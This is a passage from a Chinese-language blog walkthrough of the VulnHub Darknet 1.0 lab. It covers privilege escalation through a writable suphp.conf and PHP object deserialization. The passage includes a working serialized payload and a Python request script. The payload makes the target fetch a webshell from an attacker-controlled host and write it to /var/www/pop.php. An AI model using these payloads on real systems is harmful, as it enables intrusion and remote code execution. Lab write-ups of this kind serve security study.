+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="etc-suphp-conf-配置不当"><a href="#etc-suphp-conf-配置不当" class="headerlink" title="&#x2F;etc&#x2F;suphp.conf 配置不当"></a>&#x2F;etc&#x2F;suphp.conf 配置不当</h3><p>进入 <code>/var/www </code> 目录下发现所有文件夹运行都是 root</p>
+<p><img src="https://pic1.imgdb.cn/item/69b13c4fad79459fdc9eeca3.png"></p>
+<p>下载 <code>sec.php</code> 文件，观察代码应该是要查看反序列化</p>
+<p><img src="https://pic1.imgdb.cn/item/69b13c9fad79459fdc9eee08.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;Classes/Test.php&quot;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;Classes/Show.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;test&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$d</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">    <span class="variable">$j</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$d</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$j</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>去看看包含的两个文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name_file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$data</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;url);</span><br><span class="line">        <span class="variable">$f</span>=<span class="title function_ invoke__">fopen</span>(<span class="variable">$this</span>-&gt;path.<span class="string">&quot;/&quot;</span>.<span class="variable">$this</span>-&gt;name_file, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$f</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$f</span>);</span><br><span class="line">        <span class="title function_ invoke__">chmod</span>(<span class="variable">$this</span>-&gt;path.<span class="string">&quot;/&quot;</span>.<span class="variable">$this</span>-&gt;name_file, <span class="number">0644</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>__destruct()</code> 在对象被销毁时自动调用（例如脚本执行结束）</li>
+<li>它会从 <code>$url</code> 读取内容，然后写入 <code>$path/$name_file</code>，并设置权限为 0644</li>
+<li>如果攻击者能控制这三个属性，就可以从自己的服务器下载恶意脚本并保存到目标目录</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$woot</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Showme&quot;</span>;        </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Pwnme</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;woot=<span class="string">&quot;ROOT&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>__toString()</code> 在对象被当作字符串使用时调用（比如 <code>echo $obj</code>）</li>
+<li>这里它只是返回固定的 <code>&quot;Showme&quot;</code>，暂时没有直接危害，但可以用来测试漏洞是否可用</li>
+</ul>
+<p>先测试一下是否可用</p>
+<p><img src="https://pic1.imgdb.cn/item/69b13f73ad79459fdc9f1d0e.png"></p>
+<p>编写脚本测试</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">OBJECT = <span class="string">&quot;&quot;&quot;O:4:&quot;Show&quot;:1:&#123;s:4:&quot;woot&quot;;N;&#125;&quot;&quot;&quot;</span></span><br><span class="line">r = requests.post(<span class="string">&#x27;http://192.168.125.6/sec.php&#x27;</span>, data=&#123;<span class="string">&#x27;test&#x27;</span>: OBJECT&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/69b14068ad79459fdc9f1d10.png"></p>
+<p>排查错误发现 <code>/etc/suphp/suphp.conf</code> 文件可写</p>
+<p>suPHP 是一个用于以文件所有者权限执行 PHP 的模块，它的配置文件中：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">; Minimum UID</span><br><span class="line">min_uid=<span class="number">100</span></span><br><span class="line">; Minimum GID</span><br><span class="line">min_gid=<span class="number">100</span></span><br></pre></td></tr></table></figure>
+
+<p>这意味着 PHP 脚本的<strong>所有者 UID 必须 ≥100</strong> 才能被执行。而 <code>sec.php</code> 的所有者是 <strong>root（UID&#x3D;0）</strong>，因此 suPHP 拒绝执行它，导致 500 错误</p>
+<p>所以我们需要将其修改为 0，然后重新上传覆盖</p>
+<p><img src="https://pic1.imgdb.cn/item/69b14223ad79459fdc9f1d1c.png"></p>
+<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>目标：触发 <code>Test::__destruct()</code>，从攻击者服务器下载 webshell 并保存到 <code>/var/www/pop.php</code></p>
+<p>如果只序列化一个 <code>Test</code> 对象，反序列化后 <code>$j</code> 就是该对象。执行 <code>echo $j</code> 时，由于 <code>Test</code> 类没有 <code>__toString()</code>，PHP 会抛出致命错误（对象不能转换为字符串），导致脚本提前终止</p>
+<p>解决方案：将 <code>Test</code> 对象和一个 <code>Show</code> 对象放在同一个数组中序列化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">serialize</span>([<span class="variable">$test</span>, <span class="keyword">new</span> <span class="title class_">Show</span>()]);</span><br></pre></td></tr></table></figure>
+
+<p>反序列化后 <code>$j</code> 是一个数组，<code>echo $j</code> 只会输出 <code>&quot;Array&quot;</code>（并产生一个 Notice），而<strong>不会尝试将数组中的每个元素转为字符串</strong></p>
+<p>因此脚本可以顺利执行到结束，从而触发 <code>Test</code> 对象的 <code>__destruct()</code></p>
+<p>设置属性</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$test</span>-&gt;url = <span class="string">&#x27;http://攻击者IP:8000/shell.txt&#x27;</span>;</span><br><span class="line"><span class="variable">$test</span>-&gt;name_file = <span class="string">&#x27;pop.php&#x27;</span>;</span><br><span class="line"><span class="variable">$test</span>-&gt;path = <span class="string">&#x27;/var/www&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>最后反序列化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;O:<span class="number">4</span>:<span class="string">&quot;Test&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;url&quot;</span>;s:<span class="number">35</span>:<span class="string">&quot;http://192.168.252.1:8000/shell.txt&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;name_file&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;pop.php&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;path&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;/var/www&quot;</span>;&#125;i:<span class="number">1</span>;O:<span class="number">4</span>:<span class="string">&quot;Show&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;woot&quot;</span>;N;&#125;&#125;</span><br></pre></td></tr></table></figure>
+    </div>
+    <footer class="article-footer">
+        <a class="article-category-link" href="/categories/VulnHub/" title="VulnHub" data-aos="zoom-in">VulnHub</a>
+
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/RCE/" rel="tag" title="RCE">RCE</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/SQL-%E6%B3%A8%E5%85%A5/" rel="tag" title="SQL 注入">SQL 注入</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/XPath-%E6%B3%A8%E5%85%A5/" rel="tag" title="XPath 注入">XPath 注入</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E5%BC%B1%E5%8F%A3%E4%BB%A4/" rel="tag" title="弱口令">弱口令</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%8F%90%E6%9D%83/" rel="tag" title="提权">提权</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" rel="tag" title="敏感信息泄露">敏感信息泄露</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag" title="文件上传">文件上传</a></li></ul>
+
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+            <img data-src="/images/banner.webp" data-sizes="auto" alt="VulnHub NullByte：1" class="lazyload">
+        <a href="/2026/04/01/NullByte%201/" aria-label="前一篇: VulnHub NullByte：1" title="前一篇: VulnHub NullByte：1"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+            VulnHub NullByte：1
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+          <img data-src="/images/banner.webp" data-sizes="auto" alt="VulnHub Tr0ll：1" class="lazyload">
+      <a href="/2026/04/01/Tr0ll%201/" aria-label="后一篇: VulnHub Tr0ll：1"  title="后一篇: VulnHub Tr0ll：1"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          VulnHub Tr0ll：1
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        <span class="footer-info-sep rotate"></span>
+      ALL
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        34.8k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        02:56
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Darknet-1-0"><span class="toc-number">1.</span> <span class="toc-text">Darknet: 1.0</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">1.1.</span> <span class="toc-text">敏感信息泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache-%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.1.</span> <span class="toc-text">Apache 虚拟主机配置文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.</span> <span class="toc-text">SQL 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Darknet%EF%BC%88%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%EF%BC%89"><span class="toc-number">1.2.1.</span> <span class="toc-text">Darknet（万能密码）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE"><span class="toc-number">1.3.</span> <span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQLite"><span class="toc-number">1.3.1.</span> <span class="toc-text">SQLite</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Xpath-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.</span> <span class="toc-text">Xpath 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Contacto"><span class="toc-number">1.4.1.</span> <span class="toc-text">Contacto</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">注入点探测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E8%8A%82%E7%82%B9"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">爆破节点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E5%AD%97%E6%AE%B5%E5%B1%9E%E6%80%A7"><span class="toc-number">1.4.1.3.</span> <span class="toc-text">爆破字段属性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E5%AD%97%E6%AE%B5%E5%80%BC"><span class="toc-number">1.4.1.4.</span> <span class="toc-text">爆破字段值</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">1.5.</span> <span class="toc-text">弱口令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Secure-Login"><span class="toc-number">1.5.1.</span> <span class="toc-text">Secure Login</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.6.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#htaccess"><span class="toc-number">1.6.1.</span> <span class="toc-text">.htaccess</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.7.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#etc-suphp-conf-%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93"><span class="toc-number">1.7.1.</span> <span class="toc-text">&#x2F;etc&#x2F;suphp.conf 配置不当</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.7.2.</span> <span class="toc-text">反序列化</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="ALL" class="lazyload">
+  <div class="sidebar-author-name">ALL</div>
+  <div class="sidebar-description">雾島风起時の日常</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">39</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">22</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/duckpigdog itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+    <div class="icon-bilibili sidebar-social-icon">
+      <a href=https://space.bilibili.com/1337537884?spm_id_from=333.1007.0.0 itemprop="url" target="_blank" aria-label="bilibili" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "ALL",
+          title: "VulnHub Darknet：1.0",
+          url: "http://example.com/2026/04/01/Darknet%201.0/",
+          excerpt: "",
+          description: "",
+          stripContent: "Darknet: 1.0项目地址：https://download.vulnhub.com/darknet/Darknet.rar 是一个打包好的镜像文件 注意：导入 vmx 时一定要选择我已移动，否则没网 使用 Nmap 扫描出开放服务及操作系统版本  敏感信息泄露Apache 虚拟主机配置文件扫描目录发现一个文件  文件内容如下 123456&amp;lt;VirtualHost *:80&amp;gt;    ServerName 888.darknet.com    ServerAdmin devnul",
+          date: "Wed Apr 01 2026 16:22:00 GMT+0800",
+          updated: "Wed Apr 01 2026 17:07:15 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
